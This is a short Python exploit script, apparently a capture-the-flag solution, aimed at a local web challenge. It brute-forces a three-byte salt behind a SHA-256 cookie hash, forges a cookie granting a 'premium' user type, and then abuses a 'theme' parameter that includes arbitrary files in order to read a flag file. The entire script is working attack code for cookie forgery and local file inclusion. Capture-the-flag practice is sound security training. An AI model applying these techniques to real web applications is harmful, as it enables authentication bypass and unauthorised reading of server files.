#!/usr/bin/python3
import requests
from base64 import b64encode, b64decode
import hashlib
import json
import tqdm

# get a valid cookie from the server
s = requests.Session()
s.post('http://localhost:5000/login', data={'username': 'sToro'})
c = s.cookies
data = c['data']
data_hash = c['hash']


# when the server checks if your cookie is valid, 
# it adds 3 bytes of random data with your cookie and hashes it
# we can pretty easily figure out what those bytes were, so let's do that:
for i in tqdm.tqdm(range(1 << 24)):
    if hashlib.sha256(bytes(data+hex(i)[2:], 'utf-8')).hexdigest() == data_hash:
        correct = i
        break
print(hex(correct)[2:])

# now we want a new cookie, with premium as the user type
user_data = {"username": "sToro", "user_type": "premium"}
user_b64 = b64encode(json.dumps(user_data).encode()).decode('utf-8')
user_hash = hashlib.sha256(
    bytes(user_b64+hex(correct)[2:], 'utf-8')).hexdigest()

# finally, because SOME BUFFOON (me) made it so that themes get included by
# putting the text of the theme in a style block, we can open the flag as the theme
new_session = requests.Session()
r = new_session.get('http://localhost:5000/?theme=/secret-flag-dir/flag.txt',
                    cookies={'data': user_b64, 'hash': user_hash})
print(r.text[r.text.index('tjctf{'):r.text.index('}')+1])
